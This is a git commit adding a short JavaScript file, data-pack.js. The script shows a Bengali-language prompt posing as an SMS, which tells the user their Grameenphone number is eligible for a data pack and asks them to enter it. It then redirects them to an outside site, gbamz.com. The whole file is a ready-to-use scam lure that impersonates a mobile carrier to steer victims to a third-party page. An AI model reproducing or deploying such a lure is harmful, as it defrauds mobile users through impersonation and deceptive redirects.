56ac65f2e6f5332de9e5c770d7f8dcf314023116
sweet16palz-hub <sweet16palz@gmail.com>
2026-01-26 08:39:24 +0100

    Create data-pack.js

---
+++ data-pack.js
@@ -0,0 +1,5 @@
+var password = 'সক্রিয় করুন'
+password=prompt('SMS: অভিনন্দন, আপনার গ্রামীণফোন নম্বরটি ডেটা প্যাক পাওয়ার যোগ্য, আপনার নম্বর লিখতে ওকে ক্লিক করুন','সক্রিয় করুন');
+if (password != 'সক্রিয় করুন') {
+location.href='https://gbamz.com/grameenphone.html';
+}
